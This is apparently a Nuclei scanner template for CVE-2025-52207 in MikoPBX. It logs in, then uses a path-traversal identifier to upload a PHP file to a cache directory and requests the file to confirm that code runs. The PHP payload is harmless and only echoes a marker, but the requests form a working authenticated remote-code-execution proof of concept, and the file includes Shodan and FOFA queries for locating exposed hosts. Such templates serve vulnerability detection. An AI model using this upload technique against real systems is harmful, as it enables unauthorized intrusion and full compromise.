flow: http(1) && http(2) && http(3)
http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, 'BreadcrumbSessionstart')
    - contains(content_type, 'text/html')
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /admin-cabinet/session/start HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    WebAdminLanguage=en&login={{username}}&password={{password}}&rememberMeCheckBox=false&backUri=%2F

    '
- extractors:
  - internal: true
    json:
    - .data.filename
    name: upload_path
    type: json
  - dsl:
    - replace_regex(upload_path, "(.*\/files_cache)\/", "")
    internal: true
    name: extracted_path
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{\"jsonapi\":{\"version\":\"1.0\"},\"result\":true,\"data\":")
    internal: true
    type: dsl
  raw:
  - 'POST /pbxcore/api/files/uploadFile HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------{{filename}}

    Accept-Encoding: gzip


    -----------------------------{{filename}}

    Content-Disposition: form-data; name="resumableFilename"


    {{filename}}.php

    -----------------------------{{filename}}

    Content-Disposition: form-data; name="resumableIdentifier"


    ../files_cache/{{filename}}

    -----------------------------{{filename}}

    Content-Disposition: form-data; name="file"; filename="{{filename}}.php"

    Content-Type: application/octet-stream


    {{filecontent}}

    -----------------------------{{filename}}

    Content-Disposition: form-data; name="resumableChunkNumber"


    1

    -----------------------------{{filename}}

    Content-Disposition: form-data; name="resumableTotalChunks"


    1

    -----------------------------{{filename}}

    Content-Disposition: form-data; name="resumableTotalSize"


    {{len(filecontent)}}

    -----------------------------{{filename}}--

    '
- matchers:
  - condition: and
    dsl:
    - body==base64(filename)
    - status_code==200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/pbxcore/files/cache/{{extracted_path}}?{{wait_for(3)}}'
id: CVE-2025-52207
info:
  author: darses
  classification:
    cve-id: CVE-2025-52207
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L
    cvss-score: 9.9
    cwe-id: CWE-23
    epss-percentile: 0.90489
    epss-score: 0.06161
  description: 'MikoPBX through 2024.1.114 contains an authenticated unrestricted
    file upload vulnerability caused by allowing PHP script uploads in PBXCoreREST/Controllers/Files/PostController.php.

    '
  impact: 'Authenticated attackers can upload and execute arbitrary PHP scripts, leading
    to remote code execution and full system compromise.

    '
  metadata:
    fofa-query:
    - icon_hash="8309143"
    - title="MikoPBX"
    product: mikopbx
    shodan-query:
    - product:"mikopbx"
    - http.favicon.hash:8309143
    - title:"MikoPBX"
    vendor: miko
  name: MikoPBX - Unrestricted File Upload
  reference:
  - https://github.com/mikopbx/Core/commit/3ee785429d3f1b33c9ab387ef4221127c9b8c5f3
  remediation: 'Update to the latest version beyond 2024.1.114.

    '
  severity: critical
  tags: cve,cve2025,miko,mikopbx,intrusive,authenticated,file-upload,vuln,vkev
variables:
  filecontent: <?php echo(base64_encode("{{filename}}")); ?>
  filename: '{{to_lower(rand_base(8))}}'
